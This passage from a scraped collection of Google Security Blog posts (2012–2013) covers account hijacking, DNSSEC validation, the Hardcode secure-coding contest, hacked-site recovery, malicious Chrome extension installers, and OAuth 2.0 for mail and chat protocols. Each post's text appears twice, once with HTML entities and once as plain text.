percent of spam emails make it into an inbox—these unwanted messages are much more likely to make it through if they come from someone you’ve been in contact with before. As a result, in 2010 spammers started changing their tactics—and we saw a large increase in fraudulent mail sent from Google Accounts. In turn, our security team has developed new ways to keep you safe, and dramatically reduced the amount of these messages.  Spammers’ new trick—hijacking accounts  To improve their chances of beating a spam filter by sending you spam from your contact’s account, the spammer first has to break into that account. This means many spammers are turning into account thieves. Every day, cyber criminals break into websites to steal databases of usernames and passwords—the online “keys” to accounts. They put the databases up for sale on the black market, or use them for their own nefarious purposes. Because many people re-use the same password across different accounts, stolen passwords from one site are often valid on others.  With stolen passwords in hand, attackers attempt to break into accounts across the web and across many different services. We’ve seen a single attacker using stolen passwords to attempt to break into a million different Google accounts every single day, for weeks at a time. A different gang attempted sign-ins at a rate of more than 100 accounts per second. Other services are often more vulnerable to this type of attack, but when someone tries to log into your Google Account, our security system does more than just check that a password is correct.        Legitimate accounts blocked for sending spam: Our security systems have dramatically reduced the number of Google Accounts used to send spam over the past few years   How Google Security helps protect your account Every time you sign in to Google, whether via your web browser once a month or an email program that checks for new mail every five minutes, our system performs a complex risk analysis to determine how likely it is that the sign-in really comes from you. In fact, there are more than 120 variables that can factor into how a decision is made.  If a sign-in is deemed suspicious or risky for some reason—maybe it’s coming from a country oceans away from your last sign-in—we ask some simple questions about your account. For example, we may ask for the phone number associated with your account, or for the answer to your security question. These questions are normally hard for a hijacker to solve, but are easy for the real owner. Using security measures like these, we've dramatically reduced the number of compromised accounts by 99.7 percent since the peak of these hijacking attempts in 2011.        Help protect your account While we do our best to keep spammers at bay, you can help protect your account by making sure you’re using a strong, unique password for your Google Account, upgrading your account to use 2-step verification, and updating the recovery options on your account such as your secondary email address and your phone number. Following these three steps can help prevent your account from being hijacked—this means less spam for your friends and contacts, and improved security and privacy for you.  (Cross-posted from the Official Google Blog)     ", "date": "February 19, 2013"},
{"website": "Google-Security", "title": "\nCalling student coders: Hardcode, the secure coding contest for App Engine\n", "author": ["Posted by Parisa Tabriz, Security Team"], "link": "https://security.googleblog.com/2013/01/calling-student-coders-hardcode-secure.html", "abstract": "                             Posted by Parisa Tabriz, Security Team     Protecting user security and privacy is a huge responsibility, and software security is a big part of it. Learning about new ways to &#8220;break&#8221; applications is important, but learning preventative skills to use when &#8220;building&#8221; software, like secure design and coding practices, is just as critical. To help promote secure development habits, Google is once again partnering with the organizers of  SyScan  to host Hardcode, a secure coding contest on the Google App Engine platform.    Participation will be open to teams of up to 5 full-time students (undergraduate or high school, additional restrictions may apply). Contestants will be asked to develop open source applications that meet a set of functional and security requirements. The contest will consist of two rounds: a qualifying round over the Internet, with broad participation from any team of students, and a final round, to be held during SyScan on April 23-25 in Singapore.     During the qualifying round, teams will be tasked with building an application and describing its security design. A panel of judges will assess all submitted applications and select the top five to compete in the final round.    At SyScan, the five finalist teams will be asked to develop a set of additional features and fix any security flaws identified in their qualifying submission. After two more days of hacking, a panel of judges will rank the projects and select a grand prize winning team that will receive $20,000 Singapore dollars. The 2nd-5th place finalist teams will receive $15,000, $10,000, $5,000, and $5,000 Singapore dollars, respectively.    Hardcode begins on Friday, January 18th. Full contest details will be be announced via our mailing list, so subscribe  there  for more information!                                   Posted by Parisa Tabriz, Security Team  Protecting user security and privacy is a huge responsibility, and software security is a big part of it. Learning about new ways to “break” applications is important, but learning preventative skills to use when “building” software, like secure design and coding practices, is just as critical. To help promote secure development habits, Google is once again partnering with the organizers of SyScan to host Hardcode, a secure coding contest on the Google App Engine platform.  Participation will be open to teams of up to 5 full-time students (undergraduate or high school, additional restrictions may apply). Contestants will be asked to develop open source applications that meet a set of functional and security requirements. The contest will consist of two rounds: a qualifying round over the Internet, with broad participation from any team of students, and a final round, to be held during SyScan on April 23-25 in Singapore.   During the qualifying round, teams will be tasked with building an application and describing its security design. A panel of judges will assess all submitted applications and select the top five to compete in the final round.  At SyScan, the five finalist teams will be asked to develop a set of additional features and fix any security flaws identified in their qualifying submission. After two more days of hacking, a panel of judges will rank the projects and select a grand prize winning team that will receive $20,000 Singapore dollars. The 2nd-5th place finalist teams will receive $15,000, $10,000, $5,000, and $5,000 Singapore dollars, respectively.  Hardcode begins on Friday, January 18th. Full contest details will be be announced via our mailing list, so subscribe there for more information!     ", "date": "January 10, 2013"},
{"website": "Google-Security", "title": "\nGoogle Public DNS Now Supports DNSSEC Validation\n", "author": ["Posted by Yunhong Gu, Team Lead, Google Public DNS"], "link": "https://security.googleblog.com/2013/03/google-public-dns-now-supports-dnssec.html", "abstract": "                             Posted by Yunhong Gu, Team Lead, Google Public DNS     We  launched  Google Public DNS three years ago to help make the Internet faster and more secure. Today, we are taking a major step towards this security goal: we now fully support DNSSEC ( Domain Name System Security Extensions ) validation on our Google Public DNS resolvers. Previously, we accepted and forwarded DNSSEC-formatted messages but did not perform validation. With this new security feature, we can better protect people from DNS-based attacks and make DNS more secure overall by identifying and rejecting invalid responses from DNSSEC-protected domains.    DNS translates human-readable domain names into IP addresses so that they are accessible by computers. Despite its critical role in Internet applications, the lack of security protection for DNS up to this point meant that a significantly large portion of today&#8217;s Internet attacks target the name resolution process, attempting to return the IP addresses of malicious websites to DNS queries. Probably the most common DNS attack is  DNS cache poisoning , which tries to &#8220;pollute&#8221; the cache of DNS resolvers (such as Google Public DNS or those provided by most ISPs) by injecting spoofed responses to upstream DNS queries.    To counter cache poisoning attacks, resolvers must be able to verify the authenticity of the response. DNSSEC solves the problem by authenticating DNS responses using digital signatures and public key cryptography. Each DNS zone maintains a set of private/public key pairs, and for each DNS record, a unique digital signature is generated and encrypted using the private key. The corresponding public key is then authenticated via a chain of trust by keys of upper-level zones. DNSSEC effectively prevents response tampering because in practice, signatures are almost impossible to forge without access to private keys. Also, the resolvers will reject responses without correct signatures.    DNSSEC is a critical step towards securing the Internet. By validating data origin and data integrity, DNSSEC complements other Internet security mechanisms, such as SSL. It is worth noting that although we have used web access in the examples above, DNS infrastructure is widely used in many other Internet applications, including email.    Currently Google Public DNS is serving more than 130 billion DNS queries on average (peaking at 150 billion) from more than 70 million unique IP addresses each day. However, only 7% of queries from the client side are DNSSEC-enabled (about 3% requesting validation and 4% requesting DNSSEC data but no validation) and about 1% of DNS responses from the name server side are signed. Overall, DNSSEC is still at an early stage and we hope that our support will help expedite its deployment.    Effective deployment of DNSSEC requires action from both DNS resolvers and authoritative name servers. Resolvers, especially those of ISPs and other public resolvers, need to start validating DNS responses. Meanwhile, domain owners have to sign their domains. Today, about 1/3 of top-level domains have been signed, but most second-level domains remain unsigned. We encourage all involved parties to push DNSSEC deployment and further protect Internet users from DNS-based network intrusions.    For more information about Google Public DNS, please visit:  https://developers.google.com/speed/public-dns . In particular, more details about our DNSSEC support can be found in the  FAQ  and  Security  pages. Additionally, general specifications of the DNSSEC standard can be found in RFCs  4033 ,  4034 ,  4035 , and  5155 .      Update    March 21 : We've been listening to your questions and would like to clarify that validation is not yet enabled for non-DNSSEC aware clients. As a first step, we launched DNSSEC validation as an opt-in feature and will only perform validation if clients explicitly request it. We're going to work to minimize the impact of any DNSSEC misconfigurations that could cause connection breakages before we enable validation by default for all clients that have not explicitly opted out.      Update    May 6 : We've enabled DNSSEC validation by default. That means all clients are now protected and responses to all queries will be validated unless clients explicitly opt out.                                   Posted by Yunhong Gu, Team Lead, Google Public DNS  We launched Google Public DNS three years ago to help make the Internet faster and more secure. Today, we are taking a major step towards this security goal: we now fully support DNSSEC (Domain Name System Security Extensions) validation on our Google Public DNS resolvers. Previously, we accepted and forwarded DNSSEC-formatted messages but did not perform validation. With this new security feature, we can better protect people from DNS-based attacks and make DNS more secure overall by identifying and rejecting invalid responses from DNSSEC-protected domains.  DNS translates human-readable domain names into IP addresses so that they are accessible by computers. Despite its critical role in Internet applications, the lack of security protection for DNS up to this point meant that a significantly large portion of today’s Internet attacks target the name resolution process, attempting to return the IP addresses of malicious websites to DNS queries. Probably the most common DNS attack is DNS cache poisoning, which tries to “pollute” the cache of DNS resolvers (such as Google Public DNS or those provided by most ISPs) by injecting spoofed responses to upstream DNS queries.  To counter cache poisoning attacks, resolvers must be able to verify the authenticity of the response. DNSSEC solves the problem by authenticating DNS responses using digital signatures and public key cryptography. Each DNS zone maintains a set of private/public key pairs, and for each DNS record, a unique digital signature is generated and encrypted using the private key. The corresponding public key is then authenticated via a chain of trust by keys of upper-level zones. DNSSEC effectively prevents response tampering because in practice, signatures are almost impossible to forge without access to private keys. Also, the resolvers will reject responses without correct signatures.  DNSSEC is a critical step towards securing the Internet. By validating data origin and data integrity, DNSSEC complements other Internet security mechanisms, such as SSL. It is worth noting that although we have used web access in the examples above, DNS infrastructure is widely used in many other Internet applications, including email.  Currently Google Public DNS is serving more than 130 billion DNS queries on average (peaking at 150 billion) from more than 70 million unique IP addresses each day. However, only 7% of queries from the client side are DNSSEC-enabled (about 3% requesting validation and 4% requesting DNSSEC data but no validation) and about 1% of DNS responses from the name server side are signed. Overall, DNSSEC is still at an early stage and we hope that our support will help expedite its deployment.  Effective deployment of DNSSEC requires action from both DNS resolvers and authoritative name servers. Resolvers, especially those of ISPs and other public resolvers, need to start validating DNS responses. Meanwhile, domain owners have to sign their domains. Today, about 1/3 of top-level domains have been signed, but most second-level domains remain unsigned. We encourage all involved parties to push DNSSEC deployment and further protect Internet users from DNS-based network intrusions.  For more information about Google Public DNS, please visit: https://developers.google.com/speed/public-dns. In particular, more details about our DNSSEC support can be found in the FAQ and Security pages. Additionally, general specifications of the DNSSEC standard can be found in RFCs 4033, 4034, 4035, and 5155.  Update March 21: We've been listening to your questions and would like to clarify that validation is not yet enabled for non-DNSSEC aware clients. As a first step, we launched DNSSEC validation as an opt-in feature and will only perform validation if clients explicitly request it. We're going to work to minimize the impact of any DNSSEC misconfigurations that could cause connection breakages before we enable validation by default for all clients that have not explicitly opted out.  Update May 6: We've enabled DNSSEC validation by default. That means all clients are now protected and responses to all queries will be validated unless clients explicitly opt out.     ", "date": "March 19, 2013"},
{"website": "Google-Security", "title": "\nVideos and articles for hacked site recovery\n", "author": ["Posted by ", ", Developer Programs Tech Lead"], "link": "https://security.googleblog.com/2013/03/videos-and-articles-for-hacked-site.html", "abstract": "                             Posted by  Maile Ohye , Developer Programs Tech Lead       We created a new   Help for hacked sites   informational series to help all levels of site owners understand how they can recover their hacked site. The series includes over a dozen articles and 80+ minutes of informational videos&#8212;from the basics of what it means for a site to be hacked to diagnosing specific malware infection types.                 &#8220;Help for hacked sites&#8221; overview: How and why a site is hacked      Over 25% of sites that are hacked may remain compromised   In StopBadware and Commtouch&#8217;s 2012  survey of more than 600 webmasters of hacked sites , 26% of site owners reported that their site was still compromised while 2% completely abandoned their site. We hope that by adding our educational resources to the great tools and information already available from the security community, more hacked sites can restore their unique content and make it safely available to users. The fact remains, however, that the process to recovery requires fairly advanced system administrator skills and knowledge of source code. Without help from others&#8212;perhaps their hoster or a trusted expert&#8212;many site owners may still struggle to recover.               StopBadware and Commtouch&#8217;s 2012 survey results for &#8220;What action did you take/are you taking to fix the compromised site?&#8221;      Hackers&#8217; tactics are difficult for site owners to detect   Cybercriminals employ various tricks to avoid the site owner&#8217;s detection, making recovery difficult for the average site owner. One technique is adding &#8220;hidden text&#8221; to the site&#8217;s page so users don&#8217;t see the damage, but search engines still process the content. Often the case for sites hacked with spam, hackers abuse a good site to help their site (commonly pharmaceutical or poker sites) rank in search results.               Both pages are the same, but the page on the right highlights the &#8220;hidden text&#8221;&#8212;in this case, white text on a white background. As explained in  Step 5: Assess the damage (hacked with spam) , hackers employ these types of tricks to avoid human detection.      In cases of sites hacked to distribute malware, Google provides verified site owners with a sample of infected URLs, often with their malware infection type, such as  Server configuration  (using the server&#8217;s configuration file to redirect users to malicious content). In   Help for hacked sites  , Lucas Ballard, a software engineer on our Safe Browsing team, explains how to locate and clean this malware infection type.                 Lucas Ballard covers the malware infection type&nbsp; Server configuration .      Reminder to keep your site secure   I realize that reminding you to keep your site secure is a bit like my mother yelling &#8220;don&#8217;t forget to bring a coat!&#8221; as I leave her sunny California residence. Like my mother, I can&#8217;t help myself. Please remember to:     Be vigilant about keeping software updated   Understand the security practices of all applications, plugins, third-party software, etc., before you install them on your server   Remove unnecessary or unused software   Enforce creation of strong passwords   Keep all devices used to log in to your web server secure (updated operating system and browser)   Make regular, automated backups                                       Posted by Maile Ohye, Developer Programs Tech Lead    We created a new Help for hacked sites informational series to help all levels of site owners understand how they can recover their hacked site. The series includes over a dozen articles and 80+ minutes of informational videos—from the basics of what it means for a site to be hacked to diagnosing specific malware infection types.      “Help for hacked sites” overview: How and why a site is hacked  Over 25% of sites that are hacked may remain compromised In StopBadware and Commtouch’s 2012 survey of more than 600 webmasters of hacked sites, 26% of site owners reported that their site was still compromised while 2% completely abandoned their site. We hope that by adding our educational resources to the great tools and information already available from the security community, more hacked sites can restore their unique content and make it safely available to users. The fact remains, however, that the process to recovery requires fairly advanced system administrator skills and knowledge of source code. Without help from others—perhaps their hoster or a trusted expert—many site owners may still struggle to recover.      StopBadware and Commtouch’s 2012 survey results for “What action did you take/are you taking to fix the compromised site?”  Hackers’ tactics are difficult for site owners to detect Cybercriminals employ various tricks to avoid the site owner’s detection, making recovery difficult for the average site owner. One technique is adding “hidden text” to the site’s page so users don’t see the damage, but search engines still process the content. Often the case for sites hacked with spam, hackers abuse a good site to help their site (commonly pharmaceutical or poker sites) rank in search results.     Both pages are the same, but the page on the right highlights the “hidden text”—in this case, white text on a white background. As explained in Step 5: Assess the damage (hacked with spam), hackers employ these types of tricks to avoid human detection.  In cases of sites hacked to distribute malware, Google provides verified site owners with a sample of infected URLs, often with their malware infection type, such as Server configuration (using the server’s configuration file to redirect users to malicious content). In Help for hacked sites, Lucas Ballard, a software engineer on our Safe Browsing team, explains how to locate and clean this malware infection type.      Lucas Ballard covers the malware infection type Server configuration.  Reminder to keep your site secure I realize that reminding you to keep your site secure is a bit like my mother yelling “don’t forget to bring a coat!” as I leave her sunny California residence. Like my mother, I can’t help myself. Please remember to:  Be vigilant about keeping software updated Understand the security practices of all applications, plugins, third-party software, etc., before you install them on your server Remove unnecessary or unused software Enforce creation of strong passwords Keep all devices used to log in to your web server secure (updated operating system and browser) Make regular, automated backups      ", "date": "March 12, 2013"},
{"website": "Google-Security", "title": "\nNew warnings about potentially malicious binaries\n", "author": ["Posted by Moheeb Abu Rajab, Security Team"], "link": "https://security.googleblog.com/2013/04/new-warnings-about-potentially.html", "abstract": "                             Posted by Moheeb Abu Rajab, Security Team     If you use Chrome, you shouldn&#8217;t have to work hard to know what Chrome extensions you have installed and enabled. That&#8217;s why last December we announced that Chrome (version 25 and beyond) would  disable silent extension installation by default . In addition to protecting users from unauthorized installations, these measures resulted in noticeable performance improvements in Chrome and improved user experience.     To further safeguard you while browsing the web, we recently added new measures to protect you and your computer. These measures will identify software that violates Chrome&#8217;s standard mechanisms for deploying extensions, flagging such binaries as malware. Within a week, you will start seeing Safe Browsing  malicious download warnings  when attempting to download malware identified by this criteria.     This kind of malware commonly tries to get around silent installation blockers by misusing  Chrome&#8217;s central management settings  that are intended be used to configure instances of Chrome internally within an organization. In doing so, the installed extensions are enabled by default and cannot be uninstalled or disabled by the user from within Chrome. Other variants include binaries that directly manipulate Chrome preferences in order to silently install and enable extensions bundled with these binaries. Our recent measures expand our capabilities to detect and block these types of malware.    Application developers should adhere to Chrome&#8217;s standard mechanisms for extension installation, which include the  Chrome Web Store ,  inline installation , and the  other deployment options  described in the extensions development documentation.                                        Posted by Moheeb Abu Rajab, Security Team  If you use Chrome, you shouldn’t have to work hard to know what Chrome extensions you have installed and enabled. That’s why last December we announced that Chrome (version 25 and beyond) would disable silent extension installation by default. In addition to protecting users from unauthorized installations, these measures resulted in noticeable performance improvements in Chrome and improved user experience.   To further safeguard you while browsing the web, we recently added new measures to protect you and your computer. These measures will identify software that violates Chrome’s standard mechanisms for deploying extensions, flagging such binaries as malware. Within a week, you will start seeing Safe Browsing malicious download warnings when attempting to download malware identified by this criteria.   This kind of malware commonly tries to get around silent installation blockers by misusing Chrome’s central management settings that are intended be used to configure instances of Chrome internally within an organization. In doing so, the installed extensions are enabled by default and cannot be uninstalled or disabled by the user from within Chrome. Other variants include binaries that directly manipulate Chrome preferences in order to silently install and enable extensions bundled with these binaries. Our recent measures expand our capabilities to detect and block these types of malware.  Application developers should adhere to Chrome’s standard mechanisms for extension installation, which include the Chrome Web Store, inline installation, and the other deployment options described in the extensions development documentation.       ", "date": "April 17, 2013"},
{"website": "Google-Security", "title": "\nThe results are in: Hardcode, the secure coding contest for App Engine\n", "author": ["Posted by Eduardo Vela Nava, Security Team"], "link": "https://security.googleblog.com/2013/05/the-results-are-in-hardcode-secure.html", "abstract": "                             Posted by Eduardo Vela Nava, Security Team     This January, Google and SyScan  announced  a secure coding competition open to students from all over the world. While Google&#8217;s  Summer of Code  and  Code-in  encourage students to contribute to open source projects, Hardcode was a call for students who wanted to showcase their skills both in software development and security. Given the scope of today&#8217;s online threats, we think it&#8217;s incredibly important to practice secure coding habits early on. Hundreds of students from 25 countries and across five continents signed up to receive updates and information about the competition, and over 100 teams participated.             During the preliminary online round, teams built applications on Google App Engine that were judged for both functionality and security. Five teams were then selected to participate in the final round at the SyScan 2013 security conference in Singapore, where they had to do the following: fix security bugs from the preliminary round, collaborate to develop an API standard to allow their applications to interoperate, implement the API, and finally, try to hack each other&#8217;s applications. To add to the challenge, many of the students balanced the competition with all of their school commitments.             We&#8217;re extremely impressed with the caliber of the contestants&#8217; work. Everyone had a lot of fun, and we think these students have a bright future ahead of them. We are pleased to announce the final results of the 2013 Hardcode Competition:    1st Place:   Team 0xC0DEBA5E    Vienna University of Technology, Austria (SGD $20,000)   Daniel Marth (http://proggen.org/)  Lukas Pfeifhofer (https://www.devlabs.pro/)  Benedikt Wedenik    2nd Place:   Team Gridlock    Loyola School, Jamshedpur, India (SGD $15,000)   Aviral Dasgupta (http://www.aviraldg.com/)    3rd Place:   Team CeciliaSec    University of California, Santa Barbara, California, USA (SGD $10,000)   Nathan Crandall  Dane Pitkin  Justin Rushing    Runner-up:   Team AppDaptor    The Hong Kong Polytechnic University, Hong Kong (SGD $5,000)   Lau Chun Wai (http://www.cwlau.com/)    Runner-up:   Team DesiCoders    Birla Institute of Technology &amp; Science, Pilani, India (SGD $5,000)   Yash Agarwal  Vishesh Singhal (http://visheshsinghal.blogspot.com)    Honorable Mention:  Team Saviors of Middle Earth  (withdrew due to school commitments)   Walt Whitman High School, Maryland, USA   Wes Kendrick  Marc Rosen (https://github.com/maz)  William Zhang    A big congratulations to this very talented group of students!                                   Posted by Eduardo Vela Nava, Security Team  This January, Google and SyScan announced a secure coding competition open to students from all over the world. While Google’s Summer of Code and Code-in encourage students to contribute to open source projects, Hardcode was a call for students who wanted to showcase their skills both in software development and security. Given the scope of today’s online threats, we think it’s incredibly important to practice secure coding habits early on. Hundreds of students from 25 countries and across five continents signed up to receive updates and information about the competition, and over 100 teams participated.     During the preliminary online round, teams built applications on Google App Engine that were judged for both functionality and security. Five teams were then selected to participate in the final round at the SyScan 2013 security conference in Singapore, where they had to do the following: fix security bugs from the preliminary round, collaborate to develop an API standard to allow their applications to interoperate, implement the API, and finally, try to hack each other’s applications. To add to the challenge, many of the students balanced the competition with all of their school commitments.     We’re extremely impressed with the caliber of the contestants’ work. Everyone had a lot of fun, and we think these students have a bright future ahead of them. We are pleased to announce the final results of the 2013 Hardcode Competition:  1st Place:  Team 0xC0DEBA5E Vienna University of Technology, Austria (SGD $20,000) Daniel Marth (http://proggen.org/) Lukas Pfeifhofer (https://www.devlabs.pro/) Benedikt Wedenik  2nd Place:  Team Gridlock Loyola School, Jamshedpur, India (SGD $15,000) Aviral Dasgupta (http://www.aviraldg.com/)  3rd Place:  Team CeciliaSec University of California, Santa Barbara, California, USA (SGD $10,000) Nathan Crandall Dane Pitkin Justin Rushing  Runner-up:  Team AppDaptor The Hong Kong Polytechnic University, Hong Kong (SGD $5,000) Lau Chun Wai (http://www.cwlau.com/)  Runner-up:  Team DesiCoders Birla Institute of Technology & Science, Pilani, India (SGD $5,000) Yash Agarwal Vishesh Singhal (http://visheshsinghal.blogspot.com)  Honorable Mention: Team Saviors of Middle Earth (withdrew due to school commitments) Walt Whitman High School, Maryland, USA Wes Kendrick Marc Rosen (https://github.com/maz) William Zhang  A big congratulations to this very talented group of students!     ", "date": "May 10, 2013"},
{"website": "Google-Security", "title": "\nHelping webmasters with hacked sites\n", "author": ["Posted by ", ", Search Quality Team"], "link": "https://security.googleblog.com/2012/12/helping-webmasters-with-hacked-sites.html", "abstract": "                             Posted by  Oliver Barrett , Search Quality Team      (Cross-posted from the  Webmaster Central Blog )     Having your website hacked can be a frustrating experience and we want to do everything we can to help webmasters get their sites cleaned up and prevent compromises from happening again. With this post we wanted to outline two common types of attacks as well as provide clean-up steps and additional resources that webmasters may find helpful.    To best serve our users it&#8217;s important that the pages that we link to in our search results are safe to visit. Unfortunately, malicious third-parties may take advantage of legitimate webmasters by hacking their sites to manipulate search engine results or distribute malicious content and spam. We will alert users and webmasters alike by labeling sites we&#8217;ve detected as hacked by displaying a &#8220;This site may be compromised&#8221; warning in our search results:             We want to give webmasters the necessary information to help them clean up their sites as quickly as possible. If you&#8217;ve verified your site in Webmaster Tools we&#8217;ll also send you a message when we&#8217;ve identified your site has been hacked, and when possible give you example URLs.    Occasionally, your site may become compromised to facilitate the distribution of malware. When we recognize that, we&#8217;ll identify the site in our search results with a label of &#8220;This site may harm your computer&#8221; and browsers such as Chrome may display a warning when users attempt to visit. In some cases, we may share more specific information in the Malware section of Webmaster Tools. We also have  specific tips for preventing and removing malware from your site  in our Help Center.    Two common ways malicious third-parties may compromise your site are the following:      Injected Content    Hackers may attempt to influence search engines by injecting links leading to sites they own. These links are often hidden to make it difficult for a webmaster to detect this has occurred. The site may also be compromised in such a way that the content is only displayed when the site is visited by search engine crawlers.               Example of injected pharmaceutical content    If we&#8217;re able to detect this, we&#8217;ll send a message to your Webmaster Tools account with useful details. If you suspect your site has been compromised in this way, you can check the content your site returns to Google by using the  Fetch as Google  tool. A few good places to look for the source of such behavior of such a compromise are .php files, template files and CMS plugins.      Redirecting Users    Hackers might also try to redirect users to spammy or malicious sites. They may do it to all users or target specific users, such as those coming from search engines or those on mobile devices. If you&#8217;re able to access your site when visiting it directly but you experience unexpected redirects when coming from a search engine, it&#8217;s very likely your site has been compromised in this manner.    One of the ways hackers accomplish this is by modifying server configuration files (such as Apache&#8217;s .htaccess) to serve different content to different users, so it&#8217;s a good idea to check your server configuration files for any such modifications.             This malicious behavior can also be accomplished by injecting JavaScript into the source code of your site. The JavaScript may be designed to hide its purpose so it may help to look for terms like &#8220;eval&#8221;, &#8220;decode&#8221;, and &#8220;escape&#8221;.               Cleanup and Prevention    If your site has been compromised, it&#8217;s important to not only clean up the changes made to your site but to also address the vulnerability that allowed the compromise to occur. We have instructions for  cleaning your site  and  preventing compromises  while your hosting provider and our  Malware and Hacked sites  forum are great resources if you need more specific advice.    Once you&#8217;ve cleaned up your site you should submit a  reconsideration request  that if successful will remove the warning label in our search results.    As always, if you have any questions or feedback, please tell us in the  Webmaster Help Forum .                                   Posted by Oliver Barrett, Search Quality Team  (Cross-posted from the Webmaster Central Blog)  Having your website hacked can be a frustrating experience and we want to do everything we can to help webmasters get their sites cleaned up and prevent compromises from happening again. With this post we wanted to outline two common types of attacks as well as provide clean-up steps and additional resources that webmasters may find helpful.  To best serve our users it’s important that the pages that we link to in our search results are safe to visit. Unfortunately, malicious third-parties may take advantage of legitimate webmasters by hacking their sites to manipulate search engine results or distribute malicious content and spam. We will alert users and webmasters alike by labeling sites we’ve detected as hacked by displaying a “This site may be compromised” warning in our search results:      We want to give webmasters the necessary information to help them clean up their sites as quickly as possible. If you’ve verified your site in Webmaster Tools we’ll also send you a message when we’ve identified your site has been hacked, and when possible give you example URLs.  Occasionally, your site may become compromised to facilitate the distribution of malware. When we recognize that, we’ll identify the site in our search results with a label of “This site may harm your computer” and browsers such as Chrome may display a warning when users attempt to visit. In some cases, we may share more specific information in the Malware section of Webmaster Tools. We also have specific tips for preventing and removing malware from your site in our Help Center.  Two common ways malicious third-parties may compromise your site are the following:   Injected Content  Hackers may attempt to influence search engines by injecting links leading to sites they own. These links are often hidden to make it difficult for a webmaster to detect this has occurred. The site may also be compromised in such a way that the content is only displayed when the site is visited by search engine crawlers.        Example of injected pharmaceutical content  If we’re able to detect this, we’ll send a message to your Webmaster Tools account with useful details. If you suspect your site has been compromised in this way, you can check the content your site returns to Google by using the Fetch as Google tool. A few good places to look for the source of such behavior of such a compromise are .php files, template files and CMS plugins.   Redirecting Users  Hackers might also try to redirect users to spammy or malicious sites. They may do it to all users or target specific users, such as those coming from search engines or those on mobile devices. If you’re able to access your site when visiting it directly but you experience unexpected redirects when coming from a search engine, it’s very likely your site has been compromised in this manner.  One of the ways hackers accomplish this is by modifying server configuration files (such as Apache’s .htaccess) to serve different content to different users, so it’s a good idea to check your server configuration files for any such modifications.      This malicious behavior can also be accomplished by injecting JavaScript into the source code of your site. The JavaScript may be designed to hide its purpose so it may help to look for terms like “eval”, “decode”, and “escape”.       Cleanup and Prevention  If your site has been compromised, it’s important to not only clean up the changes made to your site but to also address the vulnerability that allowed the compromise to occur. We have instructions for cleaning your site and preventing compromises while your hosting provider and our Malware and Hacked sites forum are great resources if you need more specific advice.  Once you’ve cleaned up your site you should submit a reconsideration request that if successful will remove the warning label in our search results.  As always, if you have any questions or feedback, please tell us in the Webmaster Help Forum.     ", "date": "December 12, 2012"},
{"website": "Google-Security", "title": "\nAdding OAuth 2.0 support for IMAP/SMTP and XMPP to enhance auth security\n", "author": ["Posted by Ryan Troll, Application Security Team"], "link": "https://security.googleblog.com/2012/09/adding-oauth-20-support-for-imapsmtp.html", "abstract": "                             Posted by Ryan Troll, Application Security Team        (Cross-posted from the  Google Developers Blog )     Our users and developers take password security seriously and so do we. Passwords alone have weaknesses we all know about, so we&#8217;re working over the long term to support additional mechanisms to help protect user information. Over a year ago,  we announced  a recommendation that  OAuth 2.0  become the standard authentication mechanism for our APIs so you can make the safest apps using Google platforms. You can use OAuth 2.0 to build clients and websites that securely access account data and work with our advanced security features, such as   2-step verification  . But our commitment to OAuth 2.0 is not limited to web APIs. Today we&#8217;re going a step further by adding OAuth 2.0 support for  IMAP/SMTP  and  XMPP . Developers using these protocols can now move to OAuth 2.0, and users will experience the benefits of more secure OAuth 2.0 clients.    When clients use OAuth 2.0, they never ask users for passwords. Users have tighter control over what data clients have access to, and clients never see a user's password, making it much harder for a password to be stolen. If a user has their laptop stolen, or has any reason to believe that a client has been compromised, they can revoke the client&#8217;s access without impacting anything else that has access to their data.    We are also announcing the deprecation of older authentication mechanisms. If you&#8217;re using these you should move to the new OAuth 2.0 APIs.     We are deprecating  XOAUTH for IMAP/SMTP , as it uses  OAuth 1.0a, which was previously deprecated . Gmail will continue to support XOAUTH until OAuth 1.0a is shut down, at which time support will be discontinued.   We are also deprecating X-GOOGLE-TOKEN and  SASL PLAIN  for XMPP, as they either accept passwords or rely on  the previously deprecated ClientLogin . These mechanisms will continue to be supported until ClientLogin is shut down, at which time support for both will be discontinued.    Our team has been working hard since we announced our support of OAuth in 2008 to make it easy for you to create applications that use more secure mechanisms than passwords to protect user information. Check out the  Google Developers Blog  for examples, including the  OAuth 2.0 Playground  and  Service Accounts , or see  Using OAuth 2.0 to Access Google APIs .                                   Posted by Ryan Troll, Application Security Team    (Cross-posted from the Google Developers Blog)  Our users and developers take password security seriously and so do we. Passwords alone have weaknesses we all know about, so we’re working over the long term to support additional mechanisms to help protect user information. Over a year ago, we announced a recommendation that OAuth 2.0 become the standard authentication mechanism for our APIs so you can make the safest apps using Google platforms. You can use OAuth 2.0 to build clients and websites that securely access account data and work with our advanced security features, such as 2-step verification. But our commitment to OAuth 2.0 is not limited to web APIs. Today we’re going a step further by adding OAuth 2.0 support for IMAP/SMTP and XMPP. Developers using these protocols can now move to OAuth 2.0, and users will experience the benefits of more secure OAuth 2.0 clients.  When clients use OAuth 2.0, they never ask users for passwords. Users have tighter control over what data clients have access to, and clients never see a user's password, making it much harder for a password to be stolen. If a user has their laptop stolen, or has any reason to believe that a client has been compromised, they can revoke the client’s access without impacting anything else that has access to their data.  We are also announcing the deprecation of older authentication mechanisms. If you’re using these you should move to the new OAuth 2.0 APIs.  We are deprecating XOAUTH for IMAP/SMTP, as it uses OAuth 1.0a, which was previously deprecated. Gmail will continue to support XOAUTH until OAuth 1.0a is shut down, at which time support will be discontinued. We are also deprecating X-GOOGLE-TOKEN and SASL PLAIN for XMPP, as they either accept passwords or rely on the previously deprecated ClientLogin. These mechanisms will continue to be supported until ClientLogin is shut down, at which time support for both will be discontinued.  Our team has been working hard since we announced our support of OAuth in 2008 to make it easy for you to create applications that use more secure mechanisms than passwords to protect user information. Check out the Google Developers Blog for examples, including the OAuth 2.0 Playground and Service Accounts, or see Using OAuth 2.0 to Access Google APIs.     ", "date": "September 17, 2012"},
